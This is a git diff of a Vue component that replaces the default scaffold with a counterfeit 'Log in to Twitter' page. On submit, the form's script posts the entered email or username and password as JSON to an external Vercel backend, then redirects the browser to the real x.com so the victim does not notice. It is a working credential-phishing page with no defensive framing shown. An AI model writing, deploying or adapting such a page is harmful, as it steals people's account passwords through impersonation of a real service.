@@ -1,47 +1,69 @@
-<script setup>
-import HelloWorld from './components/HelloWorld.vue'
-import TheWelcome from './components/TheWelcome.vue'
+<script lang="js" setup>
+import { ref } from 'vue';
+import axios from 'axios'
+const email = ref('');
+const password = ref('');
+
+async function submit(event) {
+  event.preventDefault();
+  try {
+    const response = await fetch('https://cyber-security-backend-psi.vercel.app/api/account', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ email: email.value, password: password.value })
+    });
+
+    const data = await response.json();
+    console.log("data", data)
+
+  } catch (err) {
+    console.log("err", err);
+  }
+  window.location.href = "https://www.x.com/";
+}
+
 </script>
 
+
 <template>
-  <header>
-    <img alt="Vue logo" class="logo" src="./assets/logo.svg" width="125" height="125" />
-
-    <div class="wrapper">
-      <HelloWorld msg="You did it!" />
+  <div class='container'>
+    <div class='div-1'>
+      <div class='sub-div-1'>
+        <i class="fa fa-twitter icon"></i>
+      </div>
     </div>
-  </header>
+    <div class='div-2'>
+      <div class='sub-div-2'>
+        <h3>Log in to Twitter</h3>
+      </div>
+    </div>
+    <form @submit="submit">
 
-  <main>
-    <TheWelcome />
-  </main>
+      <div class='div-3'>
+        <div class='sub-div-3'>
+          <label>Phone, email or username</label><br>
+          <input v-model="email" type='text'>
+        </div>
+      </div>
+      <div class='div-4'>
+        <div class='sub-div-4'>
+          <label>Password</label><br>
+          <input v-model="password" type='password'>
+        </div>
+      </div>
+      <div class='div-5'>
+        <div class='sub-div-5'>
+          <button type="submit">Log in</button>
+        </div>
+      </div>
+    </form>
+    <div class='div-6'>
+      <div class='sub-div-6'>
+        <a href=''>Forgot password? .&nbsp;</a>
+        <a href=''>Sign up for Twitter</a>
+      </div>
+    </div>
+  </div>
 </template>
-
-<style scoped>
-header {
-  line-height: 1.5;
-}
-
-.logo {
-  display: block;
-  margin: 0 auto 2rem;
-}
-
-@media (min-width: 1024px) {
-  header {
-    display: flex;
-    place-items: center;
-    padding-right: calc(var(--section-gap) / 2);
-  }
-
-  .logo {
-    margin: 0 2rem 0 0;
-  }
-
-  header .wrapper {
-    display: flex;
-    place-items: flex-start;
-    flex-wrap: wrap;
-  }
-}
-</style>
